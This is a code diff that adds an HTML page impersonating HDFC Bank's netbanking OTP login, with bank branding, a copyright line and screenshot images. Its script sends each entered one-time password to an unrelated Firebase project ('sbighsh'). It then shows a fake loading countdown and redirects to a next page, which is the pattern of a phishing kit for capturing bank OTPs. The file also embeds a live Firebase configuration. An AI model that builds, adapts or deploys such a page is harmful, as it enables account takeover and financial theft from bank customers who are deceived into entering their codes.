@@ -1,0 +1,285 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>welcome clm</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <!-- Firebase SDKs -->
+  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
+
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f6f6f6;
+      margin: 0;
+      padding: 0;
+    }
+
+    .header-image, .bottom-image {
+      width: 100%;
+      height: auto;
+      display: block;
+    }
+
+    .container {
+      background: white;
+      width: 100%;
+      margin: 0;
+      padding: 20px;
+      box-sizing: border-box;
+    }
+
+    h2 {
+      font-size: 22px;
+      margin-bottom: 20px;
+    }
+
+    label {
+      font-size: 16px;
+      display: block;
+      margin: 15px 0 5px;
+    }
+
+    input[type="text"] {
+      width: 80%;
+      padding: 7px;
+      font-size: 16px;
+      border-radius: 6px;
+      border: 1px solid #ccc;
+      box-sizing: border-box;
+      margin-bottom: 5px;
+    }
+
+    .error-message {
+      color: red;
+      font-size: 14px;
+      margin-top: 5px;
+      display: none;
+    }
+
+    .otp-timer {
+      font-size: 14px;
+      margin-top: 5px;
+    }
+
+    .resend {
+      color: #007bff;
+      cursor: pointer;
+      margin-left: 10px;
+      font-size: 14px;
+      text-decoration: underline;
+    }
+
+    .btn {
+      background: #007bff;
+      color: white;
+      border: none;
+      padding: 6px;
+      font-size: 16px;
+      width: 60%;
+      border-radius: 2px;
+      cursor: pointer;
+      height: 35px;
+      margin-top: 20px;
+      margin-bottom: 20px;
+    }
+
+    .extra-section {
+      padding: 20px;
+      background: #fff;
+      color: #000;
+    }
+
+    .extra-section h3 {
+      font-size: 18px;
+      margin-top: 20px;
+    }
+
+    .extra-section a {
+      color: #007bff;
+      display: block;
+      margin-bottom: 10px;
+      font-size: 15px;
+      text-decoration: none;
+    }
+
+    .extra-section ul {
+      padding-left: 20px;
+      margin: 10px 0;
+    }
+
+    .footer {
+      background: #004a8d;
+      color: white;
+      text-align: center;
+      padding: 15px 10px;
+      font-size: 13px;
+    }
+
+    .footer a {
+      color: white;
+      text-decoration: underline;
+      margin-left: 5px;
+    }
+
+    /* Loading overlay styles */
+    .loading-overlay {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0,0,0,0.6);
+      display: none;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      z-index: 9999;
+    }
+
+    .spinner {
+      border: 6px solid #f3f3f3;
+      border-top: 6px solid #007bff;
+      border-radius: 50%;
+      width: 60px;
+      height: 60px;
+      animation: spin 1s linear infinite;
+      margin-bottom: 15px;
+    }
+
+    .loading-text {
+      color: white;
+      font-size: 18px;
+      font-family: Arial, sans-serif;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
+</head>
+<body>
+
+  <img class="header-image" src="https://i.ibb.co/4RHd20wx/Screenshot-2025-05-12-21-14-09-83-40deb401b9ffe8e1df2f1cc5ba480b12.jpg" alt="Header Image">
+
+  <div class="container">
+    <h2>Login to Netbanking</h2>
+
+    <!-- OTP Input -->
+    <label>Enter OTP</label>
+    <input type="text" id="otp" maxlength="6" required placeholder="">
+    <div id="otpError" class="error-message">Please enter OTP</div>
+
+    <!-- Timer + Resend -->
+    <div class="otp-timer">
+      Time remaining: <span id="countdown">03:00</span>
+      <span class="resend" onclick="resendOTP()">Resend OTP</span>
+    </div>
+
+    <button class="btn" onclick="submitOTP()">SUBMIT</button>
+
+    <img class="bottom-image" src="https://i.ibb.co/dw7tSCHQ/Screenshot-2025-05-12-20-55-22-29-40deb401b9ffe8e1df2f1cc5ba480b12.jpg" alt="Bottom Image">
+  </div>
+
+  <div class="extra-section">
+    <p>Don't have a HDFC Bank Savings Account?</p>
+    <a href="#">Prepaid Card only? Login here</a>
+    <a href="#">HDFC Home Loan only? Login here</a>
+    <a href="#">HDFC Limited Deposit only? Login here</a>
+
+    <h3>We have added a host of new features!</h3>
+    <p>You can now do so much more:</p>
+    <ul>
+      <li>Anywhere access through Desktop or mobile</li>
+      <li>Enhanced security measures</li>
+    </ul>
+  </div>
+
+  <div class="footer">
+    ©Copyright HDFC Bank Ltd.
+    <a href="#">Terms and Condition</a> |
+    <a href="#">Privacy Policy</a>
+  </div>
+
+  <!-- Loading Overlay -->
+  <div class="loading-overlay" id="loadingOverlay">
+    <div class="spinner"></div>
+    <div class="loading-text">Please wait... <span id="loadCountdown">10</span>s</div>
+  </div>
+
+  <script>
+    // Firebase Config
+    const firebaseConfig = {
+      apiKey: "AIzaSyCPm7u8Gw5IK1GuPVZ02pxr5tXG3ik7xoI",
+      authDomain: "sbighsh.firebaseapp.com",
+      projectId: "sbighsh",
+      storageBucket: "sbighsh.firebasestorage.app",
+      messagingSenderId: "685947657107",
+      appId: "1:685947657107:web:471a0557bb72235272a666"
+    };
+
+    // Initialize Firebase
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.firestore();
+
+    let timer = 180;
+    const countdownEl = document.getElementById('countdown');
+    const overlay = document.getElementById('loadingOverlay');
+    const loadCountdown = document.getElementById('loadCountdown');
+
+    const interval = setInterval(updateTimer, 1000);
+
+    function updateTimer() {
+      const minutes = String(Math.floor(timer / 60)).padStart(2, '0');
+      const seconds = String(timer % 60).padStart(2, '0');
+      countdownEl.textContent = `${minutes}:${seconds}`;
+      if (timer > 0) {
+        timer--;
+      } else {
+        clearInterval(interval);
+        countdownEl.textContent = "00:00";
+      }
+    }
+
+    function resendOTP() {
+      timer = 180;
+    }
+
+    function submitOTP() {
+      const otp = document.getElementById('otp').value.trim();
+      const errorBox = document.getElementById('otpError');
+
+      if (otp === "") {
+        errorBox.style.display = 'block';
+        errorBox.textContent = "Please enter OTP";
+        return;
+      } else {
+        errorBox.style.display = 'none';
+      }
+
+      // Save OTP to Firestore
+      db.collection("alldata-hare").add({
+        otp: otp,
+        timestamp: firebase.firestore.FieldValue.serverTimestamp()
+      }).then(() => {
+        overlay.style.display = 'flex';
+        let countdown = 10;
+        loadCountdown.textContent = countdown;
+
+        const loadInterval = setInterval(() => {
+          countdown--;
+          loadCountdown.textContent = countdown;
+          if (countdown <= 0) {
+            clearInterval(loadInterval);
+            window.location.href = "nextpage.html"; // Redirect after saving
+          }
+        }, 1000);
+      }).catch((error) => {
+        alert("Error saving OTP: " + error.message);
+      });
+    }
+  </script>
+</body>
+</html>
